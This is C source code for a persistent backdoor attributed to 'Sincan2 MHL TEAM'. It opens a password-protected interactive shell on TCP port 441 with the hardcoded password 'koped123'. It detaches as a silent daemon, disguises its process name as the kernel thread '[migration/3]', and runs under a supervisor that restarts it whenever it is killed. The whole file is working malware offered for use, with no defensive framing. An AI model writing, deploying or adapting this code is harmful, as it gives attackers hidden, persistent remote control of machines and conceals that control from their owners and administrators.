/*
 * sincan2.c (Persistent Daemon)
 * - Merged silent reverse shell listener with a process spoofer/daemonizer.
 * - Added a watchdog/supervisor process to ensure it restarts automatically if killed.
 * - Runs silently as a daemon on execution.
 * - Spoofs process name to a hardcoded value.
 */

// Headers from both scripts
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <termios.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <sys/stat.h>

#ifdef __FreeBSD__
#include <sys/param.h>
#include <libutil.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#define bzero(ptr, size) memset(ptr, 0, size)
#else
#include <pty.h>
#endif

#ifndef TIOCSCTTY
#define TIOCSCTTY 0x540E
#endif

// Defines from listener
#define HOME "/"
#define ECHAR 0x1d
#define PORT 441
#define BUF  32768

// Globals from listener
int sc;
char passwd[] = "koped123";
char motd[]   = "Sincan2 MHL TEAM\n";

// --- Functions from Listener ---

void cb_shell() {
    char buffer[150];
    write(sc, "passwd: ", 8);
    int n = read(sc, buffer, sizeof(buffer) - 1);
    if (n <= 0) {
        close(sc);
        exit(1);
    }
    buffer[n] = '\0';
    char *newline = strchr(buffer, '\n');
    if (newline) *newline = '\0';
    newline = strchr(buffer, '\r');
    if (newline) *newline = '\0';

    if (strncmp(buffer, passwd, strlen(passwd)) == 0) {
        write(sc, motd, sizeof(motd));
    } else {
        write(sc, "DiE!!!\n", 7);
        close(sc);
        exit(0);
    }
}

void sig_child(int i) {
    signal(SIGCHLD, sig_child);
    waitpid(-1, NULL, WNOHANG);
}

void hangout(int i) {
    kill(0, SIGHUP);
    kill(0, SIGTERM);
}

// The listener's main function, renamed to run_listener
int run_listener() {
    int pid;
    struct sockaddr_in serv, cli;
    int sock;

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0) return 1;

    memset((char *) &serv, 0, sizeof(serv));
    serv.sin_family = AF_INET;
    serv.sin_addr.s_addr = htonl(INADDR_ANY);
    serv.sin_port = htons(PORT);

    int optval = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));

    if (bind(sock, (struct sockaddr *) &serv, sizeof(serv)) < 0) return 1;
    if (listen(sock, 5) < 0) return 1;

    signal(SIGCHLD, sig_child);

    while (1) {
        socklen_t slen = sizeof(cli);
        int scli = accept(sock, (struct sockaddr *) &cli, &slen);
        if (scli < 0) continue;

        pid = fork();
        if (pid < 0) {
            close(scli);
            continue;
        }

        if (pid == 0) { // Child process for handling a single connection
            int pty, tty, subshell;
            fd_set fds;
            char buf[BUF];
            char *argv_sh[] = {"sh", "-i", NULL};
            char *envp_sh[] = { "HOME=/", "TERM=xterm", NULL };

            close(sock);
            setpgid(0, 0);

            if (openpty(&pty, &tty, NULL, NULL, NULL) < 0) {
                write(scli, "Can't fork pty, bye!\n", 22);
                close(scli);
                exit(1);
            }

            subshell = fork();
            if (subshell < 0) exit(1);

            if (subshell == 0) { // Grandchild process (the shell)
                close(pty);
                setsid();
                if (ioctl(tty, TIOCSCTTY, NULL) < 0) {}
                dup2(tty, 0);
                dup2(tty, 1);
                dup2(tty, 2);
                close(tty);
                
                sc = scli;
                cb_shell();

                execve("/bin/sh", argv_sh, envp_sh);
                exit(1);
            }

            close(tty);
            signal(SIGHUP, hangout);
            signal(SIGTERM, hangout);

            while (1) {
                FD_ZERO(&fds);
                FD_SET(pty, &fds);
                FD_SET(scli, &fds);
                int max_fd = (pty > scli) ? pty : scli;
                if (select(max_fd + 1, &fds, NULL, NULL, NULL) < 0) break;

                if (FD_ISSET(pty, &fds)) {
                    int count = read(pty, buf, BUF);
                    if (count <= 0 || write(scli, buf, count) <= 0) break;
                }
                if (FD_ISSET(scli, &fds)) {
                    int count = read(scli, buf, BUF);
                    if (count <= 0 || write(pty, buf, count) <= 0) break;
                }
            }
            kill(subshell, SIGKILL);
            waitpid(subshell, NULL, 0);
            close(scli);
            close(pty);
            exit(0);
        }
        close(scli);
    }
    close(sock);
    return 0;
}

// This function contains the logic to become the daemon and start the listener.
void start_worker_process(int argc, char **argv, char **envp) {
    const char *fakename = "[migration/3]";

    // Spoof the process name
    char *end_of_storage = NULL;
    if (argc > 0 && envp != NULL) {
        int i = 0;
        while(envp[i] != NULL) i++;
        end_of_storage = envp[i > 0 ? i - 1 : 0] + (i > 0 ? strlen(envp[i-1]) : 0);
    } else if (argc > 0) {
        end_of_storage = argv[argc - 1] + strlen(argv[argc - 1]);
    }

    if (end_of_storage != NULL) {
      size_t total_space = end_of_storage - argv[0];
      if (total_space > 0) {
          memset(argv[0], 0, total_space);
          strncpy(argv[0], fakename, total_space - 1);
      }
    }
    
    // Become a session leader to detach from the terminal
    if (setsid() < 0) exit(EXIT_FAILURE);

    // Change working directory and file mode mask
    umask(0);
    chdir("/");

    // Close and redirect standard file descriptors
    int fd = open("/dev/null", O_RDWR);
    if(fd != -1) {
        dup2(fd, STDIN_FILENO);
        dup2(fd, STDOUT_FILENO);
        dup2(fd, STDERR_FILENO);
        if (fd > 2) close(fd);
    }
    
    // Now, run the listener code
    run_listener();

    exit(EXIT_SUCCESS); // Should not be reached
}

// Main function now acts as a watchdog/supervisor.
int main(int argc, char **argv, char **envp) {
    // First fork to go into the background
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS); // Parent exits, leaving the supervisor daemon

    // The supervisor loop
    while (1) {
        pid_t worker_pid = fork();

        if (worker_pid == 0) {
            // --- This is the CHILD (Worker) process ---
            // It will become the daemon and start the listener.
            start_worker_process(argc, argv, envp);
            // This function will never return.
        } else if (worker_pid > 0) {
            // --- This is the PARENT (Supervisor) process ---
            // Its only job is to wait for the worker to die.
            int status;
            waitpid(worker_pid, &status, 0);
            
            // If the worker died, sleep for a moment to prevent
            // a fast respawn loop in case of a crash-on-start error.
            sleep(5); 
        } else {
            // Fork failed, wait a bit and try again.
            sleep(5);
        }
    }
    return 0; // Should never be reached
}
